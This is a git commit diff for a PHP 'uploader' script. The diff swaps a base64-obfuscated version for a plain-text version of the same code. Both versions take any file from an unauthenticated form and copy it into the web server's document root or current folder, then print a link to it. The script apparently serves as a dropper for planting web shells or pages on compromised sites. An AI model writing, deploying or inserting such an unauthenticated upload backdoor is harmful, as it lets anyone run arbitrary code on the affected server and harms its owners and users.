79d2a3f1ee3710508300c521208bead0905c76e4
Hieki <51897150+Mkeem@users.noreply.github.com>
2020-03-28 05:58:34 +0700

    PHP uploader to root dir
    Simple Uploader PHP

--- uploader.php
+++ uploader.php
@@ -1,14 +1,14 @@
-<?php if(isset($_GET[base64_decode('dXBsb2Fk')])){
-    echo base64_decode('PGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4X2ZpbGUnID48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPjwvZm9ybT4=');} 
-    $w0 = $_SERVER[base64_decode('RE9DVU1FTlRfUk9PVA==')];
-    $f1 = @$_FILES[base64_decode('aWR4X2ZpbGU=')][base64_decode('bmFtZQ==')];
-    $o2 = $w0.base64_decode('Lw==').$f1; if(isset($_POST[base64_decode('dXBsb2Fk')])) { 
-    if(is_writable($w0)) {
-        if(@copy($_FILES[base64_decode('aWR4X2ZpbGU=')][base64_decode('dG1wX25hbWU=')], $o2)) {
-            $j3 = base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('SFRUUF9IT1NU')].base64_decode('Lw==');
-            echo "Success upload => <a href='$j3/$f1' target='_blank'><u>$j3/$f1</u></a>";} 
-            else {echo base64_decode('Z2FnYWwgdXBsb2FkIGRpIGRvY3VtZW50IHJvb3Qu');}}
-            else {
-                if(@copy($_FILES[base64_decode('aWR4X2ZpbGU=')][base64_decode('dG1wX25hbWU=')], $f1)) {
-                    echo "Success upload <b>$f1</b> di folder ini";}
-                    else {echo base64_decode('Z2FnYWwgdXBsb2Fk');}}} ?>
+<?php
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = @$_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+	if(is_writable($root)) {
+		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "Success to Upload => <a href='$web/$files' target='_blank'><u>$web/$files</u></a>";} 
+		else {echo "Failed to upload on root dir";}}
+				else {
+		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+			echo "Success upload <b>$files</b> in this folder";}
+		else {echo "Failed To Upload";}}} ?>
